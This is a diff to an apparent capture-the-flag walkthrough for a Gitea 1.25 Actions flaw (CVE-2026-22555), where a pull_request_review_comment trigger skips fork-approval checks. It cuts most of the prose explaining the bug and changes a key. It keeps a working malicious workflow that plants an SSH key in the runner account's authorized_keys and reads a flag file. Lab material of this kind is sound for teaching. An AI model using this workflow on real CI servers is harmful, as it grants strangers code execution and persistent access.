@@ -3399,39 +3399,7 @@ You now know the deliverable. So the workflow needs to:
 
 ### 3.21 Author the malicious workflow
 
-Everything is staged. You have a writable fork containing a workflow that triggers on `pull_request` and dispatches to a self-hosted runner. You have a payload. You can open a pull request with read access.
-
-##### Why that gate exists, and how it decides
-
-The gate is the correct defence, and it's worth respecting rather than dismissing.
-
-The `pull_request` trigger deliberately accepts submissions from people with no write access — that's its entire purpose. Which means, without protection, any stranger who can read a repository could run arbitrary code on its runner. For a public project with a self-hosted runner, that's catastrophic and trivially exploitable. So platforms added a rule: **if a workflow run originates from a fork, don't execute it until a maintainer has looked at it.**
-
-Now, _how_ does Gitea make that determination? It examines the **event object** — the bundle of data describing what happened, which the server builds and passes into the workflow dispatch logic. To decide whether a run came from a fork, the logic needs to know which repository the pull request's code is coming from. That information lives in the **pull request context** attached to the event.
-
-The check is roughly: look at the event's PR context, compare the head repository against the base repository, and if they differ, flag for approval.
-
-**Which means the check has a precondition.** It only works if the PR context is actually there.
-
-##### The bug
-
-In Gitea 1.25, several events can involve a pull request. `pull_request` itself, obviously. But also **`pull_request_review_comment`** — the event fired when someone posts a comment as part of reviewing a pull request.
-
-When Gitea's notifier constructs the event object for `pull_request_review_comment`, **it omits the pull request context.** The field the fork-detection logic reads simply isn't populated.
-
-Follow the consequence through:
-
-**No PR context** means the fork-detection logic has nothing to compare. **No fork detection** means the run isn't flagged. **Not flagged** means no approval required. The job is queued as though it originated from the repository itself and **dispatched immediately** to the runner.
-
-That's **CVE-2026-22555**. Notice what kind of bug it is: no memory corruption, no injection, no cryptographic weakness. It's a **logic flaw** — a code path that forgot to populate a field another code path depended on. These are among the most common serious vulnerabilities in real applications, and they're found by reading code and asking "what does this check assume?" rather than by fuzzing.
-
-The runner, incidentally, is blameless. It receives a properly signed dispatch from the Gitea server it trusts and does exactly what it's told. **The failure is entirely in the gate.**
-
-##### The consequence for your workflow
-
-So you don't use `pull_request`. You write your own workflow triggered on `pull_request_review_comment`, put it in your fork, open a pull request, and then **post a review comment** to fire the event.
-
-The existing `main.yml` with its `pull_request` trigger will also queue a run when you open the PR — and that one will sit waiting for approval forever. Ignore it. Your file is a second, separate workflow with a different trigger, and it doesn't care.
+**Why this step:** The fork is writable, but a workflow matching the upstream `on: [push, pull_request]` trigger would be held for maintainer approval when raised as a PR from a fork. A different trigger — `pull_request_review_comment` — causes Gitea 1.25's notifier to omit the PR context, preventing fork detection and bypassing the approval gate entirely while still dispatching to the upstream runner.
 
 **Command:**
 
@@ -3447,7 +3415,7 @@ jobs:
     steps:
       - run: |
           install -d -m 700 /home/svc-runner/.ssh
-          echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEw+J84bIpg2jvHPs3t4lLRn5bZQmRpFS2QSHWz3eBRW ci' >> /home/svc-runner/.ssh/authorized_keys
+          echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDySyxPTlJLXnWpd2I19ktZcMnMSWaKqlZunaBHEq2A6 ci' >> /home/svc-runner/.ssh/authorized_keys
           chmod 600 /home/svc-runner/.ssh/authorized_keys
           id
           cat /home/svc-runner/user.txt
